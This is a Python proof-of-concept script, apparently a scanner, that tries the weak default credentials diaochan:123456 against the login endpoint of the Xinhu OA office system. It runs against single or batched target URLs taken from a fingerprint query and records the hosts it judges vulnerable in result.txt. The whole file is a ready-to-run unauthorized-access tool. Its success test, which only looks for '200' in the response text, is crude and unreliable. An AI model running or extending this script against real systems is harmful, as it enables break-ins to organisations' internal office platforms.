#-*- coding: utf-8 -*-
# 信呼OA 弱口令登陆
# app="信呼协同办公系统"
import argparse
import sys
import textwrap
import requests
requests.packages.urllib3.disable_warnings()


def banner():
    test = """ 

██╗  ██╗██╗   ██╗██╗  ██╗██╗███╗   ██╗ ██████╗  █████╗ 
██║  ██║██║   ██║╚██╗██╔╝██║████╗  ██║██╔═══██╗██╔══██╗
███████║██║   ██║ ╚███╔╝ ██║██╔██╗ ██║██║   ██║███████║
██╔══██║██║   ██║ ██╔██╗ ██║██║╚██╗██║██║   ██║██╔══██║
██║  ██║╚██████╔╝██╔╝ ██╗██║██║ ╚████║╚██████╔╝██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
                                                       

                tag: this is a huxinoa weak Password poc
                          @version:1.0.0   @author:wuli
                                                                       """
    print(test)


def poc(target):
    url = target + "/?m=login"
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    json = {
        "adminuser":"ZGlhb2NoYW4%3A",
        "adminpass":"MTIzNDU2"

    }
    try:
        res = requests.post(url,headers=headers,json=json,verify=False,timeout=5).text
        if "200" in res:
            print(f"[+] {target} is vul,[diaochan:123456]")
            with open("result.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] {target} is not vul")
    except:
        print(f"[*] {target} server error")


def main():
    banner()
    parser = argparse.ArgumentParser(description='huxinoa weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="url.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        print(f"我在使用-u参数 跑单个{args.url}")
        poc(args.url)
    elif not args.url and args.file:
        print(f"我在使用-f参数 批量跑{args.file}")
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        for j in url_list:
            poc(j)
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()